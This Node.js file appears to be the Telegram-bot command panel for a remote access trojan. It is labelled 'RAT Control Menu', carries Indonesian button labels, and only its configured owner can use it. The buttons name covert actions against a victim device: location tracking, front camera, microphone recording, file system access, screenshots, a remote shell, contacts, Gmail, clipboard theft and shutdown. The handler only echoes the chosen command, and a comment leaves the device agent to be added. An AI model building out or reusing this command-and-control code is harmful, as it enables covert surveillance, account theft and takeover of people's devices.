const TelegramBot = require('node-telegram-bot-api');
const { token, owner_id } = require('./config');
const fs = require('fs');
const bot = new TelegramBot(token, { polling: true });

bot.onText(/\/start/, (msg) => {
  if (msg.chat.id.toString() !== owner_id) return;
  bot.sendMessage(msg.chat.id, `RAT Control Menu`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📍 Lokasi", callback_data: "get_location" }],
        [{ text: "📷 Kamera Depan", callback_data: "camera_front" }, { text: "🎤 Mic", callback_data: "record_mic" }],
        [{ text: "📁 File System", callback_data: "get_files" }],
        [{ text: "🖥️ Screenshot", callback_data: "screenshot" }],
        [{ text: "🔧 Shell", callback_data: "run_shell" }],
        [{ text: "📞 Kontak", callback_data: "get_contacts" }, { text: "📧 Gmail", callback_data: "get_gmail" }],
        [{ text: "🧠 Clipboard", callback_data: "get_clipboard" }],
        [{ text: "💣 Matikan Device", callback_data: "shutdown" }]
      ]
    }
  });
});

bot.on("callback_query", (query) => {
  const chatId = query.message.chat.id;
  const action = query.data;

  bot.sendMessage(chatId, `Perintah dikirim ke device: ${action}`);
  // Integrasi dengan listener/agent device di sini
});